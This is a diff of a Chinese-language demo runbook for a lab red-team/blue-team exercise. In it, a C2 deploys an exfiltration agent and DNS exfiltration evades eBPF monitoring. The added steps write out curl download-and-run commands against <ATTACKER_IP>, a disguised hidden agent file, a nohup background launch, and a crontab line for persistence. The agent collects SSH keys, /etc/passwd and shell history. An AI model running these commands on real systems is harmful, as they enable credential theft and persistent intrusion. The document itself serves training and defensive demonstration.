@@ -308,20 +308,49 @@ sudo .venv/bin/python3 red_team/exfil_listener.py
 [*] Waiting for incoming data...
 ```
 
-### T3 — 透過 C2 部署 Agent 到靶機
+### T4 — 啟動 HTTP Server + 透過 C2 部署 Agent
 
-用 `deploy_agent.sh` 啟動 HTTP server，再將一行指令貼到 C2：
+在攻擊機 T4 終端，用 `deploy_agent.sh` 啟動臨時 HTTP server：
 
 ```bash
-# 攻擊機：啟動臨時 HTTP server（會印出要貼的指令）
+# T4（攻擊機）：啟動臨時 HTTP server
 bash red_team/deploy_agent.sh <ATTACKER_IP>
 ```
 
-將印出的指令貼到 C2 prompt 中執行：
+會印出類似這樣的指令：
+```
+[+] HTTP server running (PID: 12345)
+
+[*] Paste ONE of these into C2:
+
+  curl:
+curl -sS http://<ATTACKER_IP>:8888/exfil_agent.py -o /tmp/.cache_update.py && python3 /tmp/.cache_update.py <ATTACKER_IP>
+
+  python3 (if curl fails):
+python3 -c "import urllib.request;urllib.request.urlretrieve('http://...','...')" && python3 /tmp/.cache_update.py <ATTACKER_IP>
+```
+
+> **⚠️ 重要**：不要直接複製上面的指令！C2 有 15 秒 timeout 限制，agent 執行時間超過 15 秒會被截斷。必須分兩步執行：
+
+**步驟 1 — 下載 agent（在 C2 prompt）：**
 
 ```
-C2> curl -s http://<ATTACKER_IP>:8888/exfil_agent.py -o /tmp/.cache_update.py && python3 /tmp/.cache_update.py <ATTACKER_IP>
+C2> curl -sS http://<ATTACKER_IP>:8888/exfil_agent.py -o /tmp/.cache_update.py
 ```
+
+預期輸出：`[no output]`（代表成功）。如果看到錯誤訊息，檢查 HTTP server 是否正在運行。
+
+**步驟 2 — 背景執行 agent（在 C2 prompt）：**
+
+```
+C2> nohup python3 /tmp/.cache_update.py <ATTACKER_IP> > /dev/null 2>&1 &
+```
+
+> 用 `nohup ... &` 背景執行，這樣 C2 不會等待 agent 完成，避免 15 秒 timeout。
+
+> **注意**：如果要做回合 7（crontab 持久化），**不要**按 Enter 關閉 HTTP server！
+> 讓它保持運行，crontab 每次觸發都需要重新下載 agent（因為 agent 執行完會自刪）。
+> 如果不做回合 7，可以按 Enter 關閉。
 
 Agent 會自動：
 1. 蒐集 `/etc/passwd`、`~/.ssh/*`、`~/.bash_history`、`~/vuln_api.py` 等
@@ -346,26 +375,22 @@ Agent 會自動：
 
 ### T3 — 植入 Crontab 持久化（為回合 7 埋伏筆）
 
-透過 C2 設定 crontab，讓 exfil agent 每 2 分鐘自動重新部署並執行：
+透過 C2 設定 crontab，讓 exfil agent 每 2 分鐘自動重新下載並執行：
 
 ```
-C2> bash red_team/deploy_agent.sh <ATTACKER_IP>
-```
-
-將產生的 deploy 指令改成 crontab 格式貼入 C2：
-
-```
-C2> (crontab -l 2>/dev/null; echo "*/2 * * * * echo '<base64>' | base64 -d > /tmp/.cache_update.py && python3 /tmp/.cache_update.py <ATTACKER_IP>") | crontab -
+C2> (crontab -l 2>/dev/null; echo "*/2 * * * * curl -sS http://<ATTACKER_IP>:8888/exfil_agent.py -o /tmp/.cache_update.py && python3 /tmp/.cache_update.py <ATTACKER_IP>") | crontab -
 ```
 
 > 這步不用特別展示，快速帶過即可。重點是讓回合 7 有持久化的前提。
+> Agent 執行完會自刪（`os.remove(__file__)`），所以 crontab 每次都要重新下載。
+> 這也是為什麼 deploy_agent.sh 的 HTTP server 要保持運行。
 
 ### 講解要點
 
 - 紅方取得控制後**立即**外傳資料 — 這才是真實攻擊的流程
 - DNS exfiltration 把資料編碼成 subdomain（`data.fileid.x.exfil.local`），看起來像普通 DNS query
 - 這類 covert channel 不觸發 eBPF 監控的任何 syscall pattern（沒有 memfd、沒有 reverse shell）
-- 同時植入 crontab 持久化，確保即使 C2 斷線，資料外傳也會持續
+- 同時植入 crontab 持久化（每次重新下載 + 執行 agent），確保即使 C2 斷線，資料外傳也會持續
 - MITRE ATT&CK: **T1053.003** (Scheduled Task/Job: Cron)
 
 ---
@@ -584,21 +609,29 @@ Listener 不會收到連線（進程在 connect() 前被殺）。
 > **目的**：展示回合 2b 植入的 crontab 持久化在所有防禦上線後仍持續運作，DNS exfiltration 完全繞過 eBPF v2
 > **MITRE ATT&CK**: T1053.003 (Persistence: Cron), T1048.003 (Exfiltration Over Alternative Protocol)
 
-### T3 — 確認 Exfil Listener 仍在運行
+### 事前確認（三個東西要同時在線）
 
-Listener 應該從回合 2b 就一直開著。如果已關閉，重新啟動：
+1. **T3 — Exfil Listener 仍在運行**
+   Listener 應該從回合 2b 就一直開著。如果已關閉，重新啟動：
+   ```bash
+   sudo .venv/bin/python3 red_team/exfil_listener.py
+   ```
 
-```bash
-sudo .venv/bin/python3 red_team/exfil_listener.py
-```
+2. **T4 — HTTP Server 仍在運行**
+   deploy_agent.sh 應該從回合 2b 就一直開著（沒按 Enter）。
+   如果已關閉，重新啟動：
+   ```bash
+   bash red_team/deploy_agent.sh <ATTACKER_IP>
+   ```
 
-### T2 — 確認 eBPF v2 仍在運行（--kill 模式）
-
-eBPF v2 應該從回合 6 就一直開著。
+3. **T2 — eBPF v2 仍在運行（--kill 模式）**
+   eBPF v2 應該從回合 6 就一直開著。
 
 ### 等待 Crontab 觸發
 
-回合 2b 設定的 crontab 每 2 分鐘執行一次。等待觸發（最多 2 分鐘）。
+回合 2b 設定的 crontab 每 2 分鐘自動 curl 下載 + 執行 agent。等待觸發（最多 2 分鐘）。
+
+> 可以 SSH 到靶機確認 crontab 存在：`crontab -l`
 
 ### T3 — 觀察 Listener 接收到新資料
 
@@ -623,7 +656,7 @@ exfil agent 使用的 syscall：
 
 ### 講解要點
 
-- 回合 2b 植入的 crontab **存活了整場攻防** — 藍方的 eBPF kill、v2 升級都沒有清除它
+- 回合 2b 植入的 crontab **存活了整場攻防** — 藍方的 eBPF kill、v2 升級都沒有清除它（crontab 每次重新下載 agent，即使 agent 自刪也不影響）
 - eBPF 監控的是 **syscall 行為**，但 DNS exfiltration 用的全是合法 syscall
 - 防禦缺口：
   - eBPF v1/v2 不監控 DNS 流量內容
@@ -708,6 +741,9 @@ memfd blocked  TCP bypass      port detect      eBPF v2 偵測不到
 | 蜜罐 port 2222 被占用 | `sudo lsof -i :2222` 找出佔用進程 |
 | iptables 規則殘留 | `sudo bash cleanup.sh` 一鍵清除 |
 | ip_switch.sh IP 不對 | 用第二個參數自訂：`ip_switch.sh add 192.168.1.20` |
+| C2 執行 agent 顯示 timeout | agent 需 >15 秒，必須用 `nohup ... &` 背景執行（見回合 2b） |
+| curl 下載 agent 沒輸出 | 正常！`curl -sS` 成功時無輸出，有錯誤才會顯示 |
+| deploy_agent.sh HTTP server 啟動失敗 | Port 8888 被佔用，用第二個參數換 port：`deploy_agent.sh <IP> 9999` |
 | 上次 demo 殘留影響本次 | `sudo bash cleanup.sh`（清除程序、iptables、log、loot、crontab） |
 | 想預覽會清什麼 | `sudo bash cleanup.sh --dry` |
 
